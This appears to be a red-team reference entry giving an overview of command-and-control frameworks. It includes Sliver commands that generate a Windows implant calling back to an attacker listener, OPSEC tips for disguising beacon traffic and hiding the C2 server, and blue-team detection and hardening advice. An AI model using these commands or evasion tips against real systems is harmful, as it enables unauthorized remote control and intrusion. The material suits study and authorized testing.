---
title: "C2 Frameworks – overview"
category: "red-team"
tags: ["c2", "command-and-control", "post-exploitation"]
platform: "agnostic"
mitre: ["T1071", "T1573"]
difficulty: "advanced"
updated: "2026-07-11"
author: "core"
---

# C2 Frameworks

## TL;DR
Command & Control manages implants after exploitation. Choose by: channel (HTTPS/DNS/SMB), traffic profile (malleable), cost, OPSEC. Use only in authorized engagements.

## Overview
| Framework | License | Strengths |
|-----------|---------|-----------|
| Cobalt Strike | commercial | industry standard, malleable C2, BOF |
| Sliver | open-source | mTLS/DNS/WireGuard, multi-platform, active |
| Mythic | open-source | modular, many agents, nice UI |
| Havoc | open-source | modern, evasion-focused |
| Metasploit | open-source | fast PoC, meterpreter (loud) |

## Sliver – quick start
```bash
# Server
sliver-server
# Generate an implant (mTLS)
generate --mtls 10.10.14.1:8443 --os windows --arch amd64 --save impl.exe
# Listener
mtls --lhost 10.10.14.1 --lport 8443
# After callback
sessions
use <id>
```

## Profiles / OPSEC
- A **malleable/HTTP profile** makes the beacon resemble legitimate traffic (headers, jitter, sleep).
- Domain fronting / redirectors (nginx/CDN) hide the real C2 server.
- Jitter + long sleep = less beaconing pattern.

## Detection (Blue Team)
- **Beaconing**: regular connection intervals (jitter/entropy analysis), JA3/JA3S TLS fingerprint.
- Young/rare domains, high-entropy DNS (tunnel), unusual User-Agent.
- Known CS/Sliver profiles — network/EDR signatures.

## Mitigation / Hardening
- TLS inspection + JA3 blocklist, egress allow-list, DNS monitoring.
- EDR on injection/BOF, block unknown domains/categories.

## Sources
- [The C2 Matrix](https://www.thec2matrix.com/) · [Sliver](https://github.com/BishopFox/sliver)
